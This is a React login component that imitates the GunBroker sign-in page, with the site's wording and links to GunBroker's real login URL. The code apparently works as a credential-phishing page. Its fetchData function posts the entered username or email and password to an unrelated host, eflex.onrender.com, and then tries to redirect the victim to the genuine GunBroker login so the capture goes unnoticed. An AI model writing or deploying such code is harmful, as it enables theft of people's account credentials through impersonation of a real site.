import React, {useState} from 'react';
import {
  Container, Wrapper, H1, InputHold, P, Input,Div,
  P2, Button, Bottom, First, Info, Hold, Button2
} from './LoginStyle';
import axios from 'axios';
import {useNavigate} from 'react-router-dom'


const Login = () => {

  const navigate = useNavigate();


  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("")

  const fetchData = async () =>{
   const url =  'https://eflex.onrender.com/api/login';

  await axios.post(url, {email, password}).then((res) => {
    console.log("data", res.data)
    }).then(
      navigate("https://www.gunbroker.com/user/login?ReturnUrl=/newregistration/signupdetails")
    )
  };
  
  return (
    <Container>
      <Wrapper>
        <First>
          <H1>Sign In</H1>
          <InputHold>
          <P style={{fontWeight: "bold"}}>User Name (or email address)</P>
          <Input value={email} onChange={(e) => {
            setEmail(e.target.value)
            }}/>
          </InputHold>
          <br/>
          <InputHold>
          <P style={{fontWeight: "bold"}}>Password</P>
          <Input type='password'  value={password} onChange={(e) => {
            setPassword(e.target.value)
          }}/>
          </InputHold>
          <Div>
            <input type='checkbox'/>
            <Info>Remember my log in information</Info>
          </Div>
          <Button2 
          onClick={() =>{
            fetchData();
          }}>Login</Button2>
          <P2>Forget your password?</P2>
          <Info>This site is protected by reCAPTCHA and the Google <span><a href='https://www.gunbroker.com/user/login?ReturnUrl=/newregistration/signupdetails'>PrivacyPolicy</a></span> and <span><a href='https://www.gunbroker.com/user/login?ReturnUrl=/newregistration/signupdetails'>Terms of service</a></span></Info>
        </First>
      </Wrapper>
      <Bottom>
          <Hold>
          <H1>Register</H1>
          <div>Not a member?Register and get started today.</div>
          <Button>Register</Button>
          </Hold>
      </Bottom>
    </Container>
  )
}

export default Login;